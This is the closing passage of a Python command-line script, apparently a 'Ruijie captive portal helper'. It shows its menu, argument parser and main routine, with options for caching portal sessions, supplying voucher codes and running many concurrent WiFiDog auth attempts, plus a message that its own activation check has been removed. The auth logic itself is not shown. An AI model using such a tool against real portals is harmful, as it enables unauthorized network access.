        _print_menu_status()
        choice = input("Select Option: ").strip()
        if choice == "1":
            _setup_once()
            input("Press Enter to continue...")
        elif choice == "2":
            print("[+] Starting auth monitor. Press Ctrl+C to stop.")
            _start_background_threads()
            start_process()
            return
        elif choice == "3":
            _show_cached_session()
            input("Press Enter to continue...")
        elif choice == "4":
            _set_access_code()
            input("Press Enter to continue...")
        elif choice == "0":
            return
        else:
            print(f"{C_YELLOW}[!] Invalid choice{C_RESET}")
            time.sleep(1)


def _build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="ruijie",
        description="Ruijie captive portal helper",
    )
    parser.add_argument("-s", "--setup", action="store_true", help="discover and save the Ruijie session, then exit unless -f is also used")
    parser.add_argument("-f", "--force", action="store_true", help="start the auth monitor without opening the menu")
    parser.add_argument("-c", "--code", metavar="CODE", help="voucher/access code to use for this run")
    parser.add_argument("-w", "--workers", type=int, metavar="N", help="number of concurrent WiFiDog auth attempts")
    parser.add_argument("--show-session", action="store_true", help="show cached .session_url/.ip data, then exit unless -f is also used")
    parser.add_argument("--no-menu", action="store_true", help="disable the interactive menu")
    return parser


def main(argv: list[str] | None = None) -> None:
    global ACCESS_CODE, AUTH_WORKERS, GLOBAL_DID, GLOBAL_EXP_TS, GLOBAL_STATUS

    logging.getLogger("urllib3").setLevel(logging.CRITICAL)
    if requests is not None:
        try:
            requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
        except Exception:
            pass

    args = _build_arg_parser().parse_args(argv)
    if args.code:
        ACCESS_CODE = args.code
    if args.workers is not None:
        AUTH_WORKERS = max(1, args.workers)

    use_alt_screen = not ((args.setup or args.show_session) and not args.force)
    if use_alt_screen:
        sys.stdout.write("\033[?1049h\033[?25l")
        sys.stdout.flush()
    try:
        GLOBAL_DID = get_device_id()
        add_log("[✦] DISCOVERING PORTAL & SESSION...")

        if not check_local_time_manipulation():
            render_screen()
            print(f"{C_RED}[!] Security Alert: Local Time Manipulation Detected!{C_RESET}")
            os._exit(1)

        GLOBAL_STATUS = VERIFIED_LIFETIME
        GLOBAL_EXP_TS = None
        add_log("[✓] ACTIVATION REMOVED. STARTING PORTAL WORKER...")

        if args.setup:
            _setup_once()
            if not args.force:
                return

        if args.show_session:
            _show_cached_session()
            if not args.force:
                return

        if args.force or args.no_menu or not MENU_ENABLED:
            _start_background_threads()
            start_process()
        else:
            menu_loop()
    except KeyboardInterrupt:
        add_log("[!] SCRIPT TERMINATED.")
    finally:
        stop_event.set()
        if use_alt_screen:
            sys.stdout.write("\033[?1049l\033[?25h")
            sys.stdout.flush()


if __name__ == "__main__":
    main()
